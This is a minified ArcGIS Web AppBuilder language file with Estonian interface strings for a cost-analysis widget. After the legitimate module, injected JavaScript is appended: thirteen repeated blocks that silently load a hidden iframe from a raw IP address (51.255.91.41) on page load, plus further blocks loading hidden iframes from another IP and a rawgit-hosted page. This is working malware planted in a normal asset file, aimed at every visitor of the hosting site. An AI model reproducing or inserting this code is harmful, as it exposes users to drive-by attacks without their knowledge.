// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Seadista konfig tekst:",generalSettings:{tabTitle:"\u00dcldseaded",measurementUnitLabel:"M\u00f5\u00f5t\u00fchik",currencyLabel:"M\u00f5\u00f5t\u00fchiku s\u00fcmbol",roundCostLabel:"\u00dcmarda kulu",projectOutputSettings:"Projekti v\u00e4ljundi seaded",typeOfProjectAreaLabel:"Projekti ala t\u00fc\u00fcp",bufferDistanceLabel:"Puhvri ulatus",roundCostValues:{twoDecimalPoint:"Kaks komakohta",nearestWholeNumber:"L\u00e4him t\u00e4isarv",
nearestTen:"L\u00e4him k\u00fcmme",nearestHundred:"L\u00e4him sada",nearestThousand:"L\u00e4him tuhat",nearestTenThousands:"L\u00e4him k\u00fcmme tuhat"},projectAreaType:{outline:"\u00c4\u00e4rejoon",buffer:"Puhver"},errorMessages:{currency:"Sobimatu valuuta \u00fchik",bufferDistance:"Sobimatu puhvri ulatus",outOfRangebufferDistance:"V\u00e4\u00e4rtus peab olema suurem kui 0 ja v\u00e4iksem kui v\u00f5i v\u00f5rdne 100"}},projectSettings:{tabTitle:"Projekti seaded",costingGeometrySectionTitle:"M\u00e4\u00e4ratle kuluarvutuse geograafia (valikuline)",
costingGeometrySectionNote:"M\u00e4rkus: selle kihi konfigureerimine v\u00f5imaldab kasutajal seadistada objekti mallidele geograafiate alusel kuluv\u00f5rrandeid.",projectTableSectionTitle:"Projekti seadete salvestamise laadimise v\u00f5imekus (valikuline)",projectTableSectionNote:"M\u00e4rkus: k\u00f5ikide tabelite ja kihtide konfigureerimine v\u00f5imaldab kasutajal projekti edasiseks kasutamiseks salvestada/laadida.",costingGeometryLayerLabel:"Kuluarvutuse geomeetria kiht",fieldLabelGeography:"Sildi geograafia v\u00e4li",
projectAssetsTableLabel:"Projekti varade tabel",projectMultiplierTableLabel:"Projekti kordaja t\u00e4iendava kulu tabel",projectLayerLabel:"Projekti kiht",configureFieldsLabel:"Konfigureeri v\u00e4ljad",fieldDescriptionHeaderTitle:"V\u00e4lja kirjeldus",layerFieldsHeaderTitle:"Kihi v\u00e4li",selectLabel:"Vali",errorMessages:{duplicateLayerSelection:"${layerName} on juba valitud",invalidConfiguration:"Valige ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eKuvatakse j\u00e4rgmiste tingimustega pol\u00fcgooni kiht(kihid): \x3cbr/\x3e \x3cli\x3e\tKihil peab olema \u00e2\u20ac\u0153Query\u00e2\u20ac\u009d v\u00f5imekus\x3c/li\x3e\x3cli\x3e\tKihil peab olema GlobalID v\u00e4li\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eValitud \u00e2\u20ac\u0153kuluarvutuse geomeetria kihi\u00e2\u20ac\u009d stringi ja numbrilised v\u00e4ljad kuvatakse ripploendis \u00e2\u20ac\u0153Sildi geograafia v\u00e4li\u00e2\u20ac\u009d.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eKuvatakse j\u00e4rgmiste tingimustega tabel(id): \x3cbr/\x3e \x3cli\x3eTabelil peavad olema redigeerimisv\u00f5imekused, nimelt funktsioonid \u00e2\u20ac\u0153Loo\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Kustuta\u00e2\u20ac\u009d ja \u00e2\u20ac\u0153V\u00e4rskenda\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabelil peab olema kuus t\u00e4pselt j\u00e4rgmise nime- ja andmet\u00fc\u00fcbiga v\u00e4lja:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tCostEquation (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tScenario (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tTemplateName (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eKuvatakse j\u00e4rgmiste tingimustega tabel(id): \x3cbr/\x3e \x3cli\x3eTabelil peavad olema redigeerimisv\u00f5imekused, nimelt funktsioonid \u00e2\u20ac\u0153Loo\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Kustuta\u00e2\u20ac\u009d ja \u00e2\u20ac\u0153V\u00e4rskenda\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabelil peab olema viis t\u00e4pselt j\u00e4rgmise nime- ja andmet\u00fc\u00fcbiga v\u00e4lja:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tType (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tValue (ujuv/topelt-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e\tCostindex (integer-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID-t\u00fc\u00fcpi v\u00e4li))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eKuvatakse j\u00e4rgmiste tingimustega pol\u00fcgooni kiht(kihid): \x3cbr/\x3e \x3cli\x3eKihil peavad olema redigeerimisv\u00f5imekused, nimelt funktsioonid \u00e2\u20ac\u0153Loo\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Kustuta\u00e2\u20ac\u009d ja \u00e2\u20ac\u0153V\u00e4rskenda\u00e2\u20ac\x3c/li\x3e    \x3cli\x3eKihil peab olema viis t\u00e4pselt j\u00e4rgmise nime- ja andmet\u00fc\u00fcbiga v\u00e4lja:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3eDescription (string-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3eTotalassetcost (ujuv/topelt-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3eGrossprojectcost (ujuv/topelt-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID-t\u00fc\u00fcpi v\u00e4li)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Kihi seaded",layerNameHeaderTitle:"Kihi nimi",layerNameHeaderTooltip:"Kaardi kihtide loend",EditableLayerHeaderTitle:"Muudetav",EditableLayerHeaderTooltip:"Kaasa kiht ja selle mallid kuluarvutuse vidinasse",SelectableLayerHeaderTitle:"Valitav",SelectableLayerHeaderTooltip:"Objekti geomeetriat saab kasutada uue kulu\u00fcksuse loomiseks",fieldPickerHeaderTitle:"Projekti ID (valikuline)",fieldPickerHeaderTooltip:"Valikuline v\u00e4li (string-t\u00fc\u00fcpi), kuhu salvestatakse projekti ID",
selectLabel:"Vali",noAssetLayersAvailable:"Valitud veebikaardilt ei leitud vara kihte.",disableEditableCheckboxTooltip:"Sellel kihil pole redigeerimisv\u00f5imekusi"},costingInfo:{tabTitle:"Kuluarvutuse teave",proposedMainsLabel:"Pakutud peamised",addCostingTemplateLabel:"Lisa kuluarvutuse mall",manageScenariosTitle:"Halda stsenaariume",featureTemplateTitle:"Funktsiooni mall",costEquationTitle:"Kuluv\u00f5rrand",geographyTitle:"Geograafia",scenarioTitle:"Stsenaarium",actionTitle:"Toimingud",scenarioNameLabel:"Stsenaariumi nimi",
addBtnLabel:"Lisa",srNoLabel:"ei.",deleteLabel:"Kustuta",duplicateScenarioName:"Stsenaariumi duplikaatnimi",hintText:"\x3cdiv\x3eVihje: kasutage j\u00e4rgmisi m\u00e4rks\u00f5nu\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: kasutatakse geograafia sama t\u00fc\u00fcpi vara koguarvu\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: kasutatakse rea vara pikkust ja pol\u00fcgooni vara ala\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: kasutatakse geograafia sama t\u00fc\u00fcbi rea vara kogupikkust ja pol\u00fcgooni vara koguala\x3c/li\x3e\x3c/ul\x3eSaate kasutada funktsioone nagu:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eRedigeerige kuluv\u00f5rrandit vastavalt oma projekti vajadustele.",
noneValue:"Puudub",requiredCostEquation:"${layerName} : ${templateName} sobimatu kuluv\u00f5rrand",duplicateTemplateMessage:"${layerName} : ${templateName} on olemas malli kande duplikaat",defaultEquationRequired:"${layerName} : ${templateName} vajab vaikev\u00f5rrandit",validCostEquationMessage:"Sisestage sobiv kuluv\u00f5rrand",costEquationHelpText:"Redigeerige kuluv\u00f5rrandit vastavalt oma projekti vajadustele",scenarioHelpText:"Valige stsenaarium vastavalt oma projekti vajadustele",copyRowTitle:"Kopeeri rida",
noTemplateAvailable:"Lisage ${layerName} jaoks v\u00e4hemalt \u00fcks mall",manageScenarioLabel:"Halda stsenaariumi",noLayerMessage:"Lisage ${tabName}-s v\u00e4hemalt \u00fcks kiht",noEditableLayersAvailable:"Kihi seadete vahekaardil tuleb kiht(kihid) m\u00e4rkida redigeeritavaks"},statisticsSettings:{tabTitle:"Statistika seaded",addStatisticsLabel:"Lisa statistika",fieldNameTitle:"V\u00e4li",statisticsTitle:"M\u00e4rgis",addNewStatisticsText:"Lisa uus statistika",deleteStatisticsText:"Kustuta statistika",
moveStatisticsUpText:"Liiguta statistikat \u00fcles",moveStatisticsDownText:"Liiguta statistikat alla",selectDeselectAllTitle:"Vali k\u00f5ik"},statisticsType:{countLabel:"Koguarv",averageLabel:"Keskmine",maxLabel:"Maksimum",minLabel:"Miinimum",summationLabel:"Summeerimine",areaLabel:"Ala",lengthLabel:"Pikkus"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});